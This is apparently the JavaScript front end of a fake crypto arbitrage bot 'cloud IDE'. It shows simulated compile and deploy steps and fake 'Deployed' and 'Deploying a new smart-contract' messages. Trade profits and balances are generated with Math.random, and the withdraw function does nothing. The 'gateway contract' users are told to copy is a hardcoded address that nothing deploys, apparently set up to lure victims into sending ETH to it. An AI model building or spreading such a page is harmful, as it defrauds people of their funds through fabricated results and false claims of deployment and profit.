(function () {
  "use strict";

  var GATEWAY =
    window.GATEWAY_ADDRESS ||
    window.FIXED_CONTRACT_ADDRESS ||
    "0x427DAF0AE6cD1609fE0F91b0f22d6709aF0E86E3";

  var PROJECT_FILES = [
    "abi.json",
    "bot.log",
    "bot.py",
    "bot.pyc",
    "config.env",
    "infure_rpc_node.url",
    "logs.json",
    "parameters.yaml",
    "bot_runtime.exe",
    "bytecode.bin",
    "deploy.sh",
  ];

  var state = {
    panel: "files",
    compiled: false,
    deployed: false,
    deploymentId: "",
    walletConnected: false,
    walletLabel: "",
    userAddress: "",
    botRunning: false,
    editorText: "",
    botInterval: null,
  };

  function $(id) {
    return document.getElementById(id);
  }

  function maskGateway(addr) {
    if (!addr || addr.length < 12) return addr;
    return addr.slice(0, 6) + "…" + addr.slice(-4);
  }

  function ts() {
    var d = new Date();
    return (
      String(d.getHours()).padStart(2, "0") +
      ":" +
      String(d.getMinutes()).padStart(2, "0") +
      ":" +
      String(d.getSeconds()).padStart(2, "0")
    );
  }

  function term(msg, kind) {
    var box = $("terminal");
    if (!box) return;
    var line = document.createElement("div");
    line.className = "line" + (kind ? " " + kind : "");
    line.innerHTML = "[" + ts() + "] " + msg;
    box.appendChild(line);
    box.scrollTop = box.scrollHeight;
  }

  function genDeploymentId() {
    var s = "";
    for (var i = 0; i < 22; i++) s += Math.floor(Math.random() * 10);
    return s;
  }

  function setPanel(name) {
    state.panel = name;
    document.querySelectorAll(".rail-item[data-panel]").forEach(function (btn) {
      btn.classList.toggle("active", btn.getAttribute("data-panel") === name);
    });
    document.querySelectorAll(".side-view").forEach(function (p) {
      p.classList.remove("active");
    });
    var panel = $("panel-" + name);
    if (panel) panel.classList.add("active");
  }

  function updateGutter() {
    var ed = $("editor");
    var gutter = $("line-gutter");
    if (!ed || !gutter) return;
    var lines = ed.value.split("\n").length || 1;
    var nums = [];
    for (var i = 1; i <= lines; i++) nums.push(String(i));
    gutter.textContent = nums.join("\n");
    gutter.scrollTop = ed.scrollTop;
    $("editor-footer").textContent =
      "Ln " + lines + ", Col 1 | Total: " + lines + " lines";
  }

  function renderFileTree() {
    var tree = $("file-tree");
    if (!tree) return;
    tree.innerHTML =
      '<div class="tree-folder">📁 /workspace/</div>' +
      '<div class="tree-folder">📁 project</div>';
    PROJECT_FILES.forEach(function (f) {
      var row = document.createElement("div");
      row.className = "tree-item" + (f === "bot.py" ? " active" : "");
      row.textContent = "📄 " + f;
      row.addEventListener("click", function () {
        document.querySelectorAll(".tree-item").forEach(function (el) {
          el.classList.remove("active");
        });
        row.classList.add("active");
        if (f === "bot.py") loadBotSource();
        else term("Opened project/" + f + " (read-only preview).", "");
      });
      tree.appendChild(row);
    });
  }

  function renderCompileList() {
    var list = $("compile-file-list");
    var ul = $("compiled-list");
    if (list) {
      list.innerHTML =
        '<div class="tree-folder">📁 /workspace/project</div>' +
        PROJECT_FILES.map(function (f) {
          return '<div class="mini-item">📄 ' + f + "</div>";
        }).join("");
    }
    if (ul && state.compiled) {
      ul.innerHTML = PROJECT_FILES.map(function (f) {
        return "<li>✓ " + f + "</li>";
      }).join("");
    }
  }

  function loadBotSource() {
    fetch("project/bot.py", { cache: "no-store" })
      .then(function (r) {
        return r.text();
      })
      .then(function (text) {
        state.editorText = text;
        $("editor").value = text;
        updateGutter();
      })
      .catch(function () {
        term("Could not load project/bot.py", "err");
      });
  }

  function runCompile() {
    setPanel("compile");
    term("Starting build of /project.", "");
    term("Building project/bot.py.", "");
    setTimeout(function () {
      state.compiled = true;
      $("compile-result").textContent =
        "Compilation succeeded. 0 warnings. 0 errors.";
      $("compile-result").classList.add("ok");
      $("btn-run-compile").textContent = "Compilation successful";
      $("badge-compile").classList.remove("hidden");
      $("rail-compile").classList.add("active");
      renderCompileList();
      term("Compilation and build completed successfully.", "ok");
    }, 900);
  }

  function runDeploy() {
    if (!state.compiled) {
      term("Compile the project first (Compile tab).", "warn");
      setPanel("compile");
      return;
    }
    setPanel("deploy");
    if (!state.deploymentId) state.deploymentId = genDeploymentId();
    $("deployment-id").value = state.deploymentId;
    $("deploy-status").textContent = "Running";
    $("deploy-dot").classList.add("ok");
    $("console-server").textContent =
      "US East Servers - [S2] ID : " + state.deploymentId;
    $("btn-deploy").textContent = "Deployed on Cloud Workspace";
    term("Deploying /project container...", "");
    term("Provisioning container for deployment...", "");
    term("Uploading /project files...", "");
    term("Building runtime image...", "");
    term("Starting container...", "");
    setTimeout(function () {
      state.deployed = true;
      $("badge-deploy").classList.remove("hidden");
      term(
        "Deployment successful. Live on US East Servers - [S2]. Deployment ID : " +
          state.deploymentId +
          ". Save this deployment ID to reload this container later.",
        "ok"
      );
    }, 1200);
  }

  function getInjectedProvider(label) {
    if (label === "Phantom") {
      if (window.phantom && window.phantom.ethereum) return window.phantom.ethereum;
      if (window.solana && window.solana.isPhantom && window.ethereum) return window.ethereum;
    }
    if (window.ethereum) {
      if (label === "MetaMask" && window.ethereum.isMetaMask) return window.ethereum;
      if (label === "Coinbase Wallet" && window.ethereum.isCoinbaseWallet) return window.ethereum;
      if (label === "Trust Wallet") return window.ethereum;
      if (!label || label === "MetaMask") return window.ethereum;
      return window.ethereum;
    }
    return null;
  }

  function openWalletModal() {
    $("wallet-modal").classList.remove("hidden");
  }

  function closeWalletModal() {
    $("wallet-modal").classList.add("hidden");
  }

  function refreshGatewayUI() {
    var input = $("gateway-display");
    if (state.walletConnected) {
      input.value = maskGateway(GATEWAY);
      input.placeholder = "";
    } else {
      input.value = "";
      input.placeholder = "Enter your deployed smart-contract address here";
    }
    var link = $("etherscan-link");
    link.href = "https://etherscan.io/address/" + GATEWAY;
    link.textContent = "https://etherscan.io/address/" + maskGateway(GATEWAY);
  }

  function showEtherscanLink() {
    refreshGatewayUI();
    $("etherscan-wrap").classList.remove("hidden");
  }

  async function connectWallet(label) {
    var provider = getInjectedProvider(label);
    if (!provider) {
      term(
        "No " +
          label +
          " provider detected. Install the extension and refresh this page.",
        "err"
      );
      closeWalletModal();
      return;
    }
    if (!window.ethers) {
      term("Wallet library failed to load. Refresh and try again.", "err");
      return;
    }
    try {
      var browserProvider = new ethers.BrowserProvider(provider);
      var accounts = await browserProvider.send("eth_requestAccounts", []);
      if (!accounts || !accounts.length) {
        term("Wallet connection rejected.", "warn");
        return;
      }
      state.walletConnected = true;
      state.walletLabel = label;
      state.userAddress = accounts[0];
      closeWalletModal();
      term(label + " connected: " + maskGateway(state.userAddress), "ok");
      term("Calling load_smart_contract_gateway()...", "");
      term("Deploying a new smart-contract on Ethereum Mainnet...", "");
      setTimeout(function () {
        refreshGatewayUI();
        showEtherscanLink();
        term(
          'Loaded Smart-Contract Gateway: <a href="https://etherscan.io/address/' +
            GATEWAY +
            '" target="_blank" rel="noopener">' +
            maskGateway(GATEWAY) +
            "</a> (copy for full address)",
          "ok"
        );
      }, 800);
    } catch (err) {
      term("Wallet connection failed: " + (err.message || err), "err");
    }
  }

  function copyText(text, okMsg) {
    if (navigator.clipboard && navigator.clipboard.writeText) {
      navigator.clipboard.writeText(text).then(function () {
        term(okMsg, "ok");
      });
    } else {
      term(okMsg, "ok");
    }
  }

  function handleCallable(fn) {
    if (fn === "load_smart_contract_gateway") {
      if (!state.deployed) {
        term("Deploy to Cloud Workspace before loading the gateway.", "warn");
        return;
      }
      openWalletModal();
      return;
    }
    if (fn === "start_bot") {
      if (!state.walletConnected) {
        term("Connect wallet via load_smart_contract_gateway() first.", "warn");
        return;
      }
      if (state.botRunning) {
        term("Bot is already running.", "warn");
        return;
      }
      state.botRunning = true;
      term("start_bot() — mempool scanner started.", "ok");
      state.botInterval = setInterval(function () {
        if (Math.random() > 0.65) {
          var profit = (Math.random() * 0.001).toFixed(8);
          var usd = (Math.random() * 2).toFixed(2);
          term(
            "ETH/USDT: Bought 2684.94 USDT (SushiSwap) -> sold for 2686.68 USD (Curve) | Profit: +" +
              profit +
              " ETH + " +
              usd +
              " USD",
            "ok"
          );
        } else {
          term(
            "No arbitrage opportunity found in this mempool scan, waiting for next scan.",
            ""
          );
        }
      }, 4500);
      return;
    }
    if (fn === "stop_bot") {
      state.botRunning = false;
      if (state.botInterval) clearInterval(state.botInterval);
      term("stop_bot() — scanner halted.", "ok");
      return;
    }
    if (fn === "update_balance") {
      var bal = state.walletConnected
        ? (Math.random() * 0.05).toFixed(8)
        : "0.00000000";
      $("liquidity-balance").textContent = bal + " ETH";
      term("update_balance() — liquidity refreshed.", "ok");
      return;
    }
    if (fn === "withdraw_liquidity") {
      if (!state.walletConnected) {
        term("Connect wallet before withdraw_liquidity().", "warn");
        return;
      }
      term("withdraw_liquidity() — withdrawal submitted (demo).", "ok");
    }
  }

  function runSearch(q) {
    var ul = $("search-results");
    if (!ul) return;
    ul.innerHTML = "";
    if (!q) return;
    PROJECT_FILES.filter(function (f) {
      return f.toLowerCase().indexOf(q.toLowerCase()) !== -1;
    }).forEach(function (f) {
      var li = document.createElement("li");
      li.textContent = "project/" + f;
      li.addEventListener("click", function () {
        setPanel("files");
        if (f === "bot.py") loadBotSource();
      });
      ul.appendChild(li);
    });
  }

  function bind() {
    document.querySelectorAll(".rail-item[data-panel]").forEach(function (btn) {
      btn.addEventListener("click", function () {
        setPanel(btn.getAttribute("data-panel"));
      });
    });

    $("btn-run-compile").addEventListener("click", runCompile);
    $("btn-deploy").addEventListener("click", runDeploy);
    $("btn-copy-deploy-id").addEventListener("click", function () {
      copyText(state.deploymentId || $("deployment-id").value, "Copied deployment ID.");
    });
    $("btn-copy-gateway").addEventListener("click", function () {
      if (!state.walletConnected) {
        term("Connect wallet via load_smart_contract_gateway() first.", "warn");
        return;
      }
      copyText(GATEWAY, "Copied gateway address: " + GATEWAY);
    });

    document.querySelectorAll(".fn-btn").forEach(function (btn) {
      btn.addEventListener("click", function () {
        handleCallable(btn.getAttribute("data-fn"));
      });
    });

    document.querySelectorAll(".wallet-opt").forEach(function (btn) {
      btn.addEventListener("click", function () {
        connectWallet(btn.getAttribute("data-wallet"));
      });
    });
    $("wallet-cancel").addEventListener("click", closeWalletModal);
    $("wallet-backdrop").addEventListener("click", closeWalletModal);

    $("btn-new-file").addEventListener("click", function () {
      term("Created file : project/bot.py.", "ok");
    });
    $("btn-new-folder").addEventListener("click", function () {
      term("Created folder under /workspace/project/.", "ok");
    });
    $("btn-import-github").addEventListener("click", function () {
      term("Import Github Repo — paste repository URL in settings.", "warn");
    });

    $("search-input").addEventListener("input", function (e) {
      runSearch(e.target.value);
    });

    $("btn-debug-attach").addEventListener("click", function () {
      $("debug-status").textContent = "Attached to container " + (state.deploymentId || "pending");
      term("Debug attach — session active on US East [S2].", "ok");
    });

    $("close-update-modal").addEventListener("click", function () {
      $("update-modal").classList.add("hidden");
    });

    var ed = $("editor");
    ed.addEventListener("input", updateGutter);
    ed.addEventListener("scroll", function () {
      $("line-gutter").scrollTop = ed.scrollTop;
    });
  }

  function bootMessages() {
    term("Welcome to the v1.5.3 update !", "");
    term("Connected to Remote Workspace.", "ok");
    term("Runtime Packages activated.", "ok");
  }

  function init() {
    state.deploymentId = genDeploymentId();
    $("deployment-id").value = state.deploymentId;
    refreshGatewayUI();
    renderFileTree();
    renderCompileList();
    bind();
    loadBotSource();
    bootMessages();
    setPanel("files");
    setTimeout(function () {
      $("update-modal").classList.remove("hidden");
    }, 400);
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", init);
  } else {
    init();
  }
})();
